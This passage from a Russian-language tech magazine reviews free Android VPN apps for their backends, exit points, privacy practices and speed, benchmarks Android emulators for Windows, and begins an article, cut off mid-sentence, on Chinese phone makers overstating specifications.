VPN-сервисам. Вот и мы решили посмотреть, какие в Google Play
вообще есть сервисы, связанные с обходом блокировок и сменой
юрисдикции.

ВВЕДЕНИЕ
Прежде всего — список рассматриваемых VPN-приложений:
•  SuperVPN Free VPN Client
•  TouchVPN Security Access (VPN & Proxy)
•  Free VPN Proxy by Betternet
•  Security Master / VPN Master (RU) Free proxy
•  Seed4.Me VPN Proxy

В Google Play все перечисленные приложения помечены как бесплатные,
но это не должно вводить в заблуждение — на практике либо «бесплатный»
VPN дается на какой-то период, либо его функциональность каким-то обра-
зом ограничена (например, возможностью подключаться только к определен-
ным портам). Впрочем, зачастую пользователям, которым нужно лишь «обойти
блокировку сайта», этого вполне хватает.
   Взглянем на критерии обзора. Мы сравним следующие характеристики:
•  простота использования (здесь все банально — сколько действий нужно
   совершить, чтобы подключиться к VPN);
•  поддерживаемые алгоритмы шифрования;
•  принцип работы;
•  скорость и стабильность соединения;
•  способы оплаты;
•  точки выхода трафика.

SUPERVPN
Данный сервис предоставляет VPN с точками выхода во Франции, Канаде,
США, Германии, Японии и Англии (последние два — только платно). Использо-
вать его очень легко: устанавливаешь приложение, нажимаешь большую кру-
глую кнопку... все! Не надо даже регистрироваться. Триальный период — 20
дней, далее непрерывный доступ будет всего на час с возможностью пере-
подключения. Кто предоставляет этот VPN, неизвестно — веб-сайта у прило-
жения нет. Также отсутствуют какие-либо соглашения с пользователем.
SuperVPN





SuperVPN: выбор страны

Можно выбрать страну, и больше никаких расширенных настроек не предлага-
ется. Для обычных пользователей, конечно, это не очень-то нужно — им важно,
чтобы VPN просто работал, безо всяких танцев с бубном. Тем не менее можно
было обеспечить хотя бы возможность выбора порта.
   Внутри же это самый что ни на есть обычный StrongSwan. Данные профиля
генерируются на стороне сервера на основе информации об устройстве (та-
кой как Android ID и IMSI) — при этом передаются они нехешированными, что
чревато последствиями.
   Адресов точек выхода нет практически ни в одном черном списке — исклю-
чение составляет адрес в Германии, занесенный в один из спам-списков. Ско-
рость соединения на удивление очень даже приличная — впрочем, возможно,
дело тут в триальном сроке и после его окончания скорость упадет до мини-
мума. Стоимость месяца VPN составляет 5 долларов. Из способов оплаты —
Google Wallet и PayPal.
  В целом VPN годен для обхода несложных блокировок. Для регистра-
ции где-либо его использовать не стоит, ибо неизвестно, кому принадлежат
VPN-серверы. Обилие рекламы в бесплатной версии раздражает — но на то
она и бесплатная, да и видеть рекламу ты будешь только при подключении
к серверу. При большом желании можно продлевать триальный период до бес-
конечности — для этого достаточно пошаманить над дизассемблированным
байт-кодом, чтобы вместо системных идентификаторов приложение брало их
откуда-нибудь из файла. Однако при наличии альтернатив это почти не имеет
смысла.

TOUCHVPN
TouchVPN предоставляет VPN-доступ через следующие страны:
•  Швеция;
•  Великобритания;
•  Япония;
•  Дания;
•  Франция;
• США;
•  Канада.

Как и в предыдущем приложении, присутствует большая круглая кнопка, вклю-
чающая VPN. Однако, кроме этой кнопки, на главном экране имеется еще и воз-
можность выбора страны. На планшете в горизонтальном режиме TouchVPN
запускаться не захотел, перевел в вертикальный (сказывается ориентирован-
ность на телефоны), так что пришлось разворачивать, используя приложение
для принудительного поворота экрана. VPN заявлен как полностью бесплат-
ный, без каких-либо триальных периодов, работающий лишь за счет рекламы.
В отличие от SuperVPN, у приложения как минимум есть сайт (northghost.com),
соглашение об использовании и политика конфиденциальности.
TouchVPN                                 TouchVPN: выбор страны





Настройки TouchVPN
В настройках (к которым можно получить доступ, «потянув» левый край экрана)
есть возможность включить проверку незащищенных сетей, авторазрыв сое-
динения при переходе в ждущий режим и сменить тему.
   Внутри используется OpenVPN с сертификатом и логином-паролем. Аутен-
тификационные данные генерируются на основе множества значений (в том
числе берутся значения и из сервисов Google, так что если у тебя прошивка
без данных сервисов, то воспользоваться TouchVPN не получится). Несмотря
на то что конечному пользователю для подключения по-прежнему достаточно
нажать одну кнопку, внутренняя процедура регистрации в целом выглядит го-
раздо более запутанной, чем в предыдущем приложении.
  А вот с адресами выхода трафика имеется странность: почти ни один адрес
не соответствует стране в списке. Например, если выбран пункт «США», адрес
будет в Бразилии, «Канада» — в США и так далее. Как минимум три адреса
находятся в одном-двух черных списках; впрочем, это не настолько критично.
Скорость везде выше 2 Мбит/с, видео с YouTube проигрывается вполне при-
стойно и без рывков. Триальный период как таковой отсутствует, однако вре-
менами всплывает назойливая реклама. Кроме того, в тексте условий исполь-
зования и в декомпилированном байт-коде упоминаются premium-аккаунты,
однако, как их получать, информации нет.
  В целом сервис производит неплохое впечатление, защита от левых акка-
унтов выстроена так, что с ходу найти концы сложно, однако остается непонят-
ным, как он окупается. Кроме того, есть несколько но, одно из которых — не-
соответствие точек выхода и стран.

BETTERNET
   Этот сервис был одним из самых популярных в Бразилии во время бло-
кировки WhatsApp. Бесплатно предоставляется адрес в США, из платных до-
ступны Англия, Канада, Нидерланды, Франция, Германия, Япония и Сингапур.
Есть как условия использования, так и политика конфиденциальности (к слову,
очень лояльная к пользователям — утверждается, что никакой персональной
информации не собирают).
Настроек нет, но есть возможность войти под premium учетной записью. Не-
понятно, однако, зачем — ведь при покупке premium-аккаунта используются
службы Google. Логичнее в таком случае было бы и приобретать аккаунт, при-
вязывая его не к Gmail (который как минимум у меня для каждого устройства
свой), а к обычному email.
   Внутри, как и в случае с TouchVPN, используется OpenVPN, причем реали-
зованный с помощью той же самой библиотеки de.blinkt.openvpn, обеспечи-
вающей обертку вокруг нативных библиотек. Получение аутентификационных
данных достаточно запутанно, так что обходить его бессмысленно. Скорость
соединения приличная, но ниже, чем у TouchVPN. Впрочем, потоковое аудио
воспроизводится без проблем. Стоимость premium-аккаунта составляет 326
рублей в месяц.





Betternet                                        Betternet: выбор страны

Сервис выглядит довольно пристойно, особенно соглашение о конфиденци-
альности и меньшее количество рекламы, чем у TouchVPN, однако для преми-
ум-функциональности можно было сделать и триальный режим.

SECURITY MASTER
Бесплатно предоставляет 500 Мбайт трафика. Существуют как VIP-серверы (с
меньшим временем пинга), так и бесплатные. Список стран:
•  Нидерланды;
•  Германия;
•  Франция;
•  Великобритания;
•  Канада;
• США;
•  Сингапур;
•  Япония (только VIP).

Не предоставляется ни условий использования, ни политики конфиденци-
альности. Сайт (vpn-master.com) имеется, но представляет собой фактически
рекламную страничку, ориентированную на русскоязычную аудиторию. В на-
стройках можно включить автоподключение при запуске как программы, так
и устройства. Есть симпатичный виджет для мониторинга скорости.





Security Master                                 Security Master: выбор страны

Внутри снова OpenVPN. Регистрация достаточно запутанна, но выглядит го-
раздо проще, чем в двух предыдущих приложениях, так что, если поковыряться,
можно использовать фальшивые данные. Для генерации используется в том
числе IMSI, номер телефона, Android ID и прочие уникальные для устройства
данные. Судя по всему, они передаются в открытом виде и вообще не хеширу-
ются, что, с учетом неизвестной принадлежности сервиса, выглядит как мини-
мум подозрительно.
   Какая-то часть адресов имеет приемлемую скорость, часть — ниже 1 Мбит/с,
а у части вообще невозможно замерить скорость — коннект с каким-либо
сервером контента крайне затруднен. Кроме того, в самом приложении есть
предупреждение, что при попытке использования P2P аккаунт будет заблоки-
рован. Около половины адресов выхода присутствуют в одном или нескольких
черных списках. Узнать стоимость VIP-аккаунта не удалось.
   Резюме: VPN-сервис, хотя и предоставляет множество адресов выхода,
кажется худшим из всех, что были описаны ранее. Учитывая отсутствие усло-
вий использования и политики конфиденциальности вкупе со сбором такой
информации, как IMSI, применять его не стоит.

SEED4.ME
Единственный из описываемых сервисов, предоставляющий, помимо прило-
жения, еще и классический VPN. Имеются серверы в следующих странах:
• США;
•  Великобритания;
•  Нидерланды;
•  Россия;
•  Украина;
•  Гонконг;
•  Сингапур;
•  Франция;                             WWW
•  Испания;                                                                               Краткий обзор
•  Германия;                                                             VPN-бэкендов
•  Италия;
•  Канада.

Интерфейс, по сравнению с другими приложениями, немного непривычен —
необходимо выбрать «страну виртуального присутствия», а потом нажать
кнопку «Подключить» (на сей раз кнопка квадратная). Если попробовать «по-
листать» приложение, выяснится, что, помимо возможности подключения,
есть возможность как «привязать» аккаунт к email, так и использовать уже су-
ществующий — ни у одного из описанных ранее приложений подобной функ-
циональности нет.
  На сайте (seed4.me) есть условия использования. Стоит лишь отметить, что,
если судить по ним, владельцы не следят за пользователями, однако остав-
ляют за собой такое право. Настройки отсутствуют. Единственное, что можно
настроить, — это привязка аккаунта к email.
  В качестве бэкенда используется... да-да, все тот же OpenVPN. На сей раз,
однако, чуть другая его модификация. Кроме того, разработчики очень силь-
но постарались усложнить декомпиляцию: огромная куча маленьких классов
с невразумительными именами, поток управления отследить почти невоз-
можно... происходи подобное на ПК — антивирус обязательно бы заподозрил
малварь. Из-за обфускации не удалось выяснить, какие данные используют-
ся для регистрации, однако вызов, к примеру, getLine1Number() в декомпили-
рованном коде присутствует, что, как и защита, заставляет насторожиться.
Но более внимательное изучение показало, что данные все же не пересыла-
ются в открытом виде — на их основе генерируется уникальный идентифика-
тор, который и используется в дальнейшем.





Seed4.Me                                   Seed4.Me: выбор страны

  Большая часть адресов имеет скорость примерно 2 Мбит/с, чего, в прин-
ципе, вполне достаточно для серфинга. Из адресов в одном черном списке
находится только русский и украинский. Из способов оплаты в самом прило-
жении имеется лишь Google Wallet, но на сайте указаны PayPal, QIWI, Яндекс.
Деньги, Сбербанк и даже Bitcoin. Месяц доступа стоит 5 долларов, однако
VPN-провайдер частенько проводит акции, так что шанс получить VPN бес-
платно на некоторый срок довольно велик.
  Из описываемых сервисов этот выглядит наиболее предпочтительным,
у него больше точек выхода, чем у остальных, принимается оплата отнюдь
не только карточками и есть возможность классического подключения к VPN
с помощью PPTP.

Orbot

Orbot — Tor для Android. Может применяться как обособленно, так и в ком-
плекте с браузером Orfox. Настроек меньше, чем у «настольного» Tor Browser
Bundle, однако есть возможность выбрать выходной узел Tor (в описаниях фай-
ла конфигурации эта возможность считается устаревшей). Кроме того, есть
экспериментальная возможность использования Tor в режиме VPN — режим,
впрочем, предназначен лишь для обхода межсетевых экранов, а не для обе-
спечения анонимности. При наличии root в Tor можно завернуть весь исходя-


ЗАКЛЮЧЕНИЕ
Кратко охарактеризуем все описанные сервисы.
•  SuperVPN: мало точек выхода, отсутствуют дополнительные настройки, нет
   пользовательского соглашения. Зато в черных списках только один адрес.
   Собирается много достаточно сенситивных данных.
•  TouchVPN: избыточная реклама, несоответствие заявленных стран выхода
   реальным, невозможность покупки premium-аккаунта — минусы. Наличие
   сайта и пользовательского соглашения, отсутствие триального срока —
   плюсы.
•  Betternet: на бесплатных аккаунтах исключительно адреса США, отсутствие
   триального срока, чтобы попробовать другие адреса, — минусы. Хорошие
   условия использования и политика конфиденциальности — плюсы.
•  Security Master: относительно много точек выхода — плюс. Из минусов от-
   мечу отвратительную скорость на некоторых точках выхода, блокировку
   P2P, отсутствие пользовательского соглашения, долгое ожидание ответа
   от представителя в одной из социальных сетей, к тому же около половины
   адресов занесены в черные списки.
•  Seed4.Me: наибольшее количество стран выхода, наличие сайта и пользо-
   вательского соглашения, огромное количество способов оплаты, частые
   акции для привлечения новых пользователей, возможность привязки акка-
   унта к email и использование «классического» VPN — плюсы. Минус же в том,
   что некоторые точки выхода не обеспечивают скорость выше 1 Мбит/с; лег-
   ко допустить, впрочем, что понижение скорости совпало со временем те-
   стирования.

Если говорить о минусах подобного рода приложений в целом — как ни стран-
но, почти все описанные приложения не предназначены для планшетов, соот-
ветственно, для того, чтобы они работали в режиме альбомной ориентации,
приходится использовать костыли. Еще один минус — сбор сенситивной ин-
формации об устройстве, которая чаще всего отправляется на серверы в от-
крытом виде.
   Подводя итоги: эти приложения предназначены для того, чтобы обходить
блокировки ресурсов и сидеть в Сети с незащищенных беспроводных точек
доступа. Для чего-то, требующего большей конфиденциальности/анонимно-
сти, лучше использовать либо классический VPN, либо другие средства.

Сжатие трафика

Чаще всего VPN применяется для обхода блокировок и защиты от прослуши-
вания трафика. Однако его можно использовать и для других целей, например
для экономии трафика за счет его сжатия. Существует как минимум два при-
ложения, способных делать это:
• Onavo Extend — по заверениям разработчиков, позволяет экономить тра-
  фик, сжимая его раз в пять и используя кеш (на самом деле это очень завы-
  шенная цифра);
• Opera Max — разработчики озвучивают уже более разумные цифры (эконо-
  мия трафика 50%).

В целом приложения выглядят достаточно полезно, однако не стоит забывать,
что HTTPS-трафик они, по понятным причинам, не сжимают.
MOBILE
ИЗ КАРМАНА




                                                                           Денис Погребной
                                                                                             denis2371@gmail.comВ ДЕСКТОП
БОЛЬШОЙ ТЕСТ ЭМУЛЯТОРОВ
ANDROID ДЛЯ ПК
ВВЕДЕНИЕ
В последнее время оригинальных и интересных приложений для Android ста-
новится все больше и больше. Поэтому набирают популярность и эмуляторы
Android для стационарных ПК. Многие их разработчики обещают высокую ско-
рость работы и возможность запускать игры и приложения. В этой статье я
расскажу тебе о результатах своего тестирования различных эмуляторов: что
там на самом деле с производительностью и правда ли получится поиграть.

Тестовая машина:
Процессор               Intel Core i3-3217U (2 х 1,8 ГГц)
Видеоускоритель       Intel HD Graphics 4000 (16 х 350 МГц)
Разрешение экрана   1920 х 1080
Оперативная память  4 Гбайт DDR3L (1 х 1600 МГц)
Операционная система Windows 10 x86-64

BLUESTACKS 2
Сайт:                 bluestacks.com
Поддерживаемые ОС: Windows (от XP до 10) и OS X
Версия программы:   2.0.4.5627
Версия Android:        4.4.2, API 19
Разрешение экрана:   1600 х 900





Пожалуй, это самый известный и разрекламированный эмулятор Android. Про-
грамма условно бесплатна (предлагается выбор: 24 доллара в год или уста-
новка двух спонсируемых приложений каждую неделю). В данный момент
приложение находится в активной разработке. Предназначено оно для игр
и предлагает неполноценную эмуляцию Android. На мой взгляд, наиболее ин-
тересные фишки:
•  быстрая отправка приложений на смартфон;
•  доступные «из коробки» магазины Google Play, AMD AppZone, Amazon
   Appstore;
•  удобный и интуитивно понятный интерфейс на русском языке;
•  очень простой способ обмена файлами с ОС Windows;
•  возможность запуска приложений Android TV;
•  приложения запускаются в отдельных вкладках и могут работать парал-
   лельно.

Очень серьезный недостаток — отсутствие таких эле-                                               ЛАЙФХАК
ментарных настроек, как изменение разрешения экрана,
                                                                         Добавь BlueStacksобъема используемой оперативной памяти. Однако эти
                                                                               в исключения Punto
настройки можно изменить с помощью отдельной програм-                                                                                          Switcher, чтобы
мы BlueStacks Tweaker.                                                 не было зависаний
   Несмотря на заточку под игры, эмулятор не выдал ника-     при вводе симво-
                                                                              лов с клавиатуры.ких выдающихся результатов. В AnTuTu производительность
оказалась чуть ниже, чем у конкурентов. В остальных бен-
чмарках показатели примерно на том же уровне. Обмен файлами с внешней
ОС очень простой: нажимаем на иконку с папкой, открываем файл. Появится
меню «Отправить» для этого файла. Выбираем, что с ним нужно сделать.
   Когда этот эмулятор запущен, наблюдаются небольшие фризы в ОС Windows.
А приложения, активно использующие ресурсы системы (я запускал браузер
Chrome и Microsoft Word), начинают изрядно тормозить. В самом эмуляторе
двумерные приложения работают вяло (Instagram, ВК). Фризов нет, но коли-
чество кадров в секунду часто проседает явно ниже тридцати. Даже браузер,
установленный по умолчанию, подтормаживает при просмотре простых ин-
тернет-страниц. Однако все тестовые приложения, кроме нескольких бенч-
марков, смогли запуститься и нормально работали.
  Игры. Angry birds 2 играбельна. Около 25 FPS. Clash of clans работает при-
мерно с такой же скоростью. Bad piggies вылетала при запуске. Asphalt 8 выдал
отличный результат, FPS выше 30. К сожалению, разрешение экрана в этом
эмуляторе фиксированное.
ANDY
Сайт:                  andyroid.net
Поддерживаемые ОС: Windows 7–10, Ubuntu 14.04+, OS X 10.8+
Версия программы:   46.1.268.0
Версия Android:       4.2.2 API 17
Разрешение экрана:   1920 х 1080
                                                ЛАЙФХАК

                                                                                Если у тебя
                                                                              не запустилось
                                                                                 приложе-
                                                                              ние — измени
                                                                                    в настройках
                                                                           маскируемый
                                                                 GPU (щелчок
                                                                               правой кла-
                                                                         вишей мыши
                                                                              по значку про-
                                                                         граммы в си-
                                                                            стемном трее,
                                                                               далее Settings
                                    → Advenced →
                                                                                    Set GPU Type).

Программа полностью бесплатна. Обладает огромным количеством настроек
(от смены типа эмулируемого GPU до редактирования IMEI). Ее преимущества
таковы:
•  синхронизация с мобильными устройствами;
•  возможность использовать смартфон в качестве джойстика;
•  трансляция экрана Android на ПК.

Общая папка находится по адресу %userprofile%\Andy\. Все файлы после копи-
рования в нее будут доступны с помощью файлового менеджера по адресу /
storage/sdcard0/Shared/Andy/.
  Был протестирован с разными виртуальными GPU. В AnTuTu лучшие ре-
зультаты оказались у Adreno 225. Но в GFXBench T-Rex всегда одинаковые
результаты (8,6 FPS). Кстати, в Quadrant результаты оказались очень слабыми
по сравнению с конкурентами. Обычные же приложения работают довольно
шустро.
  Игры. Bad piggies работает очень быстро. Иногда случаются микрофризы.
Clash of clans выдает FPS меньше 30, но работает стабильно. Angry birds пока-
зывает такие же результаты, но выдает больше кадров в секунду.
NOX APP PLAYER
Сайт:                en.bigNOX.com
Поддерживаемые ОС: Windows XP–10
Версия программы:    3.1.0.0
Версия Android:       4.4.2 API 19
Разрешение экрана:   1920 х 1080





В качестве оболочки используется Nova Launcher. Русскоязычный интерфейс
в самом эмуляторе отсутствует, но в настройках можно переключить Android
на русский язык. По умолчанию выбрана низкая скорость работы, чтобы
минимально грузить систему. Включить максимальное быстродействие
можно, кликнув по значку шестерни справа вверху и выбрав вкладку
Advanced.
   Особенности:
•  камера в компьютере работает «из коробки»;
•  возможность запустить несколько копий эмулятора (иконка Multi-Drive);
•  создание ярлыков для быстрого запуска установленных приложений в пап-
   ке на рабочем столе.

В результатах тестов нет ничего выдающегося. Грузит систему меньше, чем
BlueStacks (и это после установки в настройках Full HD разрешения и назначе-
ния эмулятору двух ядер процессора). Браузер Chrome, запущенный в хост-си-
стеме, подвисает не очень сильно, в Word и проводнике почти отсутствуют
фризы. NOX смог запустить все приложения, которые запускал BlueStacks.
Работают эти приложения заметно шустрее, чем у конкурента. Браузер, уста-
новленный «из коробки», работает довольно сносно, но при скроллинге стра-
ница все равно чуть-чуть подвисает.
  Игры. Angry birds 2 запустилась, но некоторые текстуры остались черны-
ми, однако это не помешало пройти несколько уровней с приемлемым фрейм-
рейтом. Clash of clans тоже запустилась, были резкие падения FPS и подвиса-
ния. В целом — играть можно. Переход из оконного режима в полноэкранный
занял больше минуты. При повторном переключении приложение зависло.
Bad piggies запустить не удалось.

MEMU
Сайт:               memuplay.com
Поддерживаемые ОС: Windows XP–10
Версия программы:    2.3.1
Версия Android:       4.2.2 API 17
Разрешение экрана:   1920 х 1080





По функциональности приложение почти не уступает конкурентам. Android
внутри лишен мусорных приложений и выглядит чище, чем на нексусах.
   Особенности:
•  относительно гибкие настройки;
•  поддержка нескольких окон;
•  копирование файлов в эмулятор с помощью drag’n’drop.

В бенчмарках MEmu показал результаты немного выше среднего. Кушает ре-
сурсы ОС Windows примерно так же, как и NOX. Во время работы эмулятора
Chrome в Windows работает, но с подвисаниями и фризами. Зато в самом эму-
ляторе никаких фризов нет. Все работает относительно гладко.
  Игры. Angry birds 2 работает быстро. Clash of clans лагает, как и в NOX. Bad
piggies не запустилась.

AMIDUOS
Сайт:                amiduos.com
Поддерживаемые ОС: Windows 7–10
Версия программы:   2.0.5.7943
Версия Android:       5.1.1 API 22
Разрешение экрана:   1920 х 1080





Разработан фирмой American Megatrends (да-да, это ее BIOS установлены
в большинстве компьютеров). DuOS использует функции гипервизора, то есть
запускает Android рядом с Windows и позволяет ей работать почти без эмуля-
ции. Стоимость составляет 9,99 доллара, но доступна демоверсия, которая
работает 30 дней без ограничений. Обладает очень минималистичным ин-
терфейсом. Даже при первом запуске следом за надписью
Android открывается обычный рабочий стол. Это единствен-   ЛАЙФХАК
ный из протестированных эмуляторов, в котором отсутствует
                                                                              Настройки у этой
привязка свайпов и координат точек к клавишам на клавиату-                                                                          программы
ре (проблема решается установкой кеймаппера). В настрой-        находятся
ках на главной вкладке можно задать общие с Windows папки.      в «Настройки
                                    → AMIDuOS®  Интерфейс работает очень плавно. В AnTuTu результаты                                                                                              Configuration
тоже впечатлили: больше 68 тысяч баллов. Да и в Quadrant           Tool».
результаты порадовали. А GFXBench не только запустился (во всех других эму-
ляторах, кроме Andy, он падал), но и выдал 36 FPS в тесте T-Rex вне экрана
(это примерно равно результату на Android-x86 на реальном железе). Но под-
держивается только OpenGL ES 2.0. Безусловно, это лидер по скорости рабо-
ты в сегодняшнем тесте (Android-x86 не считаем).
   Instagram не запустился, но другие программы работали стабильно и бы-
стро.
  Игры. При разрешении дисплея 1920 х 1080 Clash of clans шла очень плав-
но и без артефактов. При установке Angry birds и Bad piggies, к сожалению,
возникала ошибка.

DROID4X
Сайт:                www.droid4x.com
Поддерживаемые ОС: Windows, OS X (бета)
Версия программы:    0.9.0 beta
Версия Android:       4.2.2 API 17
Разрешение экрана:   1920 х 1080





Этот эмулятор дает возможность подключения папок к Windows. Интерфейс
программы на английском, но Android внутри позволяет выбрать русский. Об-
мен файлами очень прост. Шестеренка справа вверху, далее Other settings
→ Share folder. Теперь осталось выбрать нужную папку, и она отобразится во
встроенном файловом менеджере.
   Особенности:
•  поддержка технологии мультитач;
•  использование смартфона в качестве геймпада;
•  интерфейс Android почти не подвергся изменениям.

Результаты в бенчмарках средние. Все приложения, как и интерфейс, рабо-
тают довольно быстро даже в Full HD разрешении. Операционная система во
время работы этого эмулятора ведет себя как ни чем не бывало. Даже браузер
Chrome листает страницы с обычной скоростью. Пожалуй, этот эмулятор гру-
зит ОС меньше всех.
  Игры. Запустить удалось только Clash of clans. Но результат очень уди-
вил — игра работает почти так же плавно, как в DuOS.

GENYMOTION
Сайт:               www.genymotion.com
Поддерживаемые ОС: Windows, OS X, Ubuntu, Fedora, Red Hat, Debian
Версия программы:    2.6.0
Версия Android:       зависит от эмулируемого устройства
Разрешение экрана:   1024 х 600





Главное преимущество Genymotion — огромный набор реальных Android-у-
стройств для эмуляции, список которых постоянно расширяется. Но их отли-
чие только в версии Android, разрешении экрана, а также в других мелких па-
раметрах. Прошивка будет установлена примерно одна и та же (чистый Android
без сервисов Google). Основная аудитория — разработчики ПО.
   Присутствует интеграция с Android Studio и Eclipse, командный интерфейс
для скриптинга, симуляция СМС, входящих вызовов, разряда батареи, симу-
ляция сбоев в работе интернета и много других интересных вещей. Кстати,
в этом эмуляторе можно создать новое устройство и настроить в нем множе-
ство разных параметров (в том числе получить root). К сожалению, программа
не бесплатна. В бета-версии присутствует множество ограничений.
   «ВКонтакте» и Instagram установить не удалось: выскакивала ошибка. Зато
эмулятор вообще не влияет на работу Windows, браузер Chrome работает так,
будто никакого эмулятора не запущено.
  Игры. Запустилась и заработала без проблем и зависаний Bad piggies.
Clash of clans тоже запустилась и шла очень плавно. Angry birds 2 при запуске
выдавала только черный экран. Стоит отметить, что плавная работа, скорее
всего, обусловлена пониженным раз-
решением экрана в демоверсии при-
ложения.

WINDROY
Сайт:                www.windroye.com
Поддерживаемые ОС: Windows XP–10
Версия программы:    2.9.0
Версия Android:       4.4.2

При первом запуске выдал сообще-
ние об ошибке. В последующих —
черный экран и элементы управления.
Переустановка эмулятора не помог-
ла.

YOUWAVE
Сайт:               youwave.com
Поддерживаемые ОС: Windows XP–10
Версия программы:    5.4
Версия Android:       5.1.1

Так и не удалось установить. Возни-
кала ошибка во время установки.

ПОЛЕЗНОЕ И ИНТЕРЕСНОЕ
•  ARC Welder. Представляет собой
обычный плагин для браузера. Пред-
назначен для запуска приложений
прямо в браузере. Все уставленные
приложения можно найти в стандарт-  Перед запуском приложения в ARC Welder
ном менеджере приложений Chrome. Запустить не удалось ни одного. Они
запускались две-три секунды (даже включалась начальная заставка), а потом
вылетали.
•  Manymo. Не эмулятор, а WebOS (запускается на удаленном сервере). Ра-
ботает во всех современных браузерах. Картинка обновляется очень медлен-
но, многие приложения не запускаются. В общем, для полноценной работы
он не годится, но задумка оригинальная. Мне не удалось запустить на нем
ни AIDA64, ни AnTuTu, хотя результаты были бы очень интересны.
•  Android-x86. Android для обычных ПК на базе x86. В тесте сугубо для оценки
производительности других эмуляторов. 223 тысячи баллов в AnTuTu и 34 FPS
вне экрана на GFXBench в T-Rex говорят сами за себя. Но Quadrant и другие
тесты не запустились. В отличие от всяких эмуляторов, присутствует поддерж-
ка OpenGL ES 3.0.
•  В VirtualBox, QEMU или другой виртуальной машине можно установить
Android-x86. Это позволит запускать приложения Android даже в таких экзоти-
ческих ОС, как Solaris OS или BSD.





Результат теста GFXBench в Android-x86

ЗАКЛЮЧЕНИЕ
Итак, протестировав несколько эмуляторов, я пришел к выводу, что при всем их
многообразии принцип работы каждого примерно одинаковый. Все они замет-
но уступают по скорости работы настоящему Android, запущенному без всяких
эмуляторов. Единственное серьезное преимущество этих приложений в том,
что они позволяют пользоваться приложениями Android прямо из ОС Windows
и легко обмениваться с ней файлами, обладают встроенным «из коробки» кей-
маппером (в DuOS его нет).
   Какой же из них лучший? Все зависит от задачи. Самым удобным мне пока-
зался Droid4X. Он меньше всего грузит систему и быстро работает, обладает
простым и интуитивно понятным интерфейсом настроек, а также достаточным
для рядового пользователя набором функций, не перегружен лишними прило-
жениями.
  В скорости работы безусловным победителем оказался, конечно же,
DuOS. Однако он поддерживает только Windows и не все игры. Самый серьез-
ный недостаток — отсутствие привязки координат точек и свайпов к клавишам
на клавиатуре. Частично проблема решается установкой кеймаппера. Второй
по скорости работы — Droid4X (к тому же он поддерживает OS X). Пользовате-
лям Linux я бы порекомендовал Andy.
   Что касается разработки и тестирования, то здесь безусловный лидер —
Genymotion. Он предоставляет почти безграничные возможности разработчи-
кам софта для Android, благодаря симуляции разных событий в системе, нали-
чию списка реальных устройств с уже установленными параметрами, тесной
интеграции с Android Studio и Eclipse и поддержке скриптинга.

Блок-врезка: Пара советов

Если не удается запустить нужное приложение или игру (или оно работает
с ошибками), рекомендую попробовать утилиту GLTools. Она устанавливает
альтернативный драйвер OpenGL, который поддается гибкой настройке. Это
может быть маскировка названия видеоускорителя, включение или отключе-
ние сглаживания и так далее.
   Если привязка координат точек и свайпов к клавишам на клавиатуре в эму-
ляторе отсутствует или работает некорректно, то можно поставить кеймаппер
(приложение для передачи на экран нажатий и действий с разных манипулято-
ров). Среди самых известных: Tincore Keymapper, GKM Touch. Для их коррект-
ной работы понадобятся права root.
MOBILE





                                                                                Олег Афонин
                                                                                            эксперт по мобильной
                                                                                         криминалистике
                                                                                     компании Элкомсофт,
                                                                                                  aoleg@voicecallcentral.com


ИЗ КИТАЯ
С ЛЮБОВЬЮ
ВЫБИРАЕМ БЮДЖЕТНЫЙ
СМАРТФОН ПРАВИЛЬНО
В условиях перманентного кризиса покупка смартфона
или планшета из Китая кажется удачным способом сэко-
номить и получить устройство с флагманскими характе-
ристиками за треть цены такого же, но сделанного про-
изводителями «первого эшелона». Но откуда берется эта
сказочная экономия и почему вообще китайские устрой-
ства бывают настолько дешевыми? Попробуем выяснить,
а заодно поговорим о том, как правильно выбирать ки-
тайский смартфон и стоит ли это делать, когда в продаже
есть прошлогодние флагманы именитых производителей.

Если не брать в расчет совсем уж копеечные ноунеймы и присмотреться
к устройствам в ценовом диапазоне 150–200 долларов, то можно найти мно-
жество на первый взгялд действительно неплохих моделей. Хорошее каче-
ство сборки, современные компоненты, яркие экраны с отличной цветопере-
дачей — китайцы научились делать хорошие продукты, экономя на рабочей
силе, дизайне (который просто копируется), рекламе и прямой дистрибуции
без посредников. Однако если копнуть глубже, окажется, что все не так радуж-
но и порой великая китайская мысль заходит слишком далеко в желании еще
чуть-чуть срезать цену аппарата.

ВСЕ ВРУТ
Нельзя сказать, что абсолютно все
китайские производители склон-
ны завышать характеристики сво-
их устройств или хитрым образом
подавать информацию так, чтобы
и нужное впечатление создать,
и умолчать кое о чем. Однако ис-
ключить обман полностью нельзя.
Доверяй, но проверяй!
   Приведу несколько примеров
из собственной практики. Аппарат
Ulefone Be Touch 2. Производитель
соврал дважды: фальсифициро-
вав версию Android, под управле-
нием которой работает аппарат,
и  указав  завышенную  емкость
аккумулятора  (в реальности он    Ulefone Be Touch 2
остался точно таким же, как и в пер-
вой модели, сменив лишь цифру, на-
печатанную на обертке).
   Как можно фальсифицировать
версию Android? Очень просто: за-
писать в системном файле  build.
prop версию 5.1. Быстрый, грязный
и дешевый способ «обновления»
с фактической версии 5.0. Ulefone
Be Touch 2 — далеко не единствен-
ное устройство, идущее с «фаль-
шивой» версией системы. Читай,
смотри обзоры — такие вещи неза-
висимые обозреватели пропускают
редко.
   Думаешь, врут не все, а толь-
ко  «подвальные»  производители?
Как бы не так! Компания Lenovo —
вполне известный и крупный кон-
церн – не гнушается ввести по-
купателя  в  заблуждение.  Взять,
к примеру, Lenovo K3 Note. В боль-
шинстве зарубежных обзоров мы                                        Lenovo K3 Note
видим  стандартное
«экран хороший, яр-
кий,  цвета  сочные,
все отлично». А вот
обозреватели с сай-
та iXBT не настолько    Lenovo
                          Yogaдоверчивы.  Не  по-                               Tablet 2
ленившись   сфото-
графировать  экран
смартфона, эксперты
обнаружили, что вме-
сто заявленного раз-
решения  1920х1080
в  устройстве  уста-
новлена более деше-
вая матрица с раз-
решением 1920x720.
Полюбуйся
   Думаешь, единичный случай? Нет! Возьмем, например, планшет Lenovo
Yoga Tablet 2 (8″) в версии Android. На официальном американском сайте ком-
пании в характеристиках устройства указана поддержка карт памяти до 64 Гб
(цитата с сайта: Supporting Micro SD card up to 64GB).
  И все бы хорошо, но есть тонкость. Купив 64-гигабайтную карту и вставив ее
в планшет, ты увидишь предложение ее отформатировать. Что такое, почему?
А дело в том, что по официально принятому стандарту карты памяти объемом
64 Гб и больше должны (обязаны, черт возьми!) соответствовать специфика-
ции SDXC. А она четко и ясно, английским по белому, прописывает обязатель-
ный к использованию на подобных картах тип файловой системы: exFAT.
  И снова все бы хорошо, да вот использование exFAT требует покупать
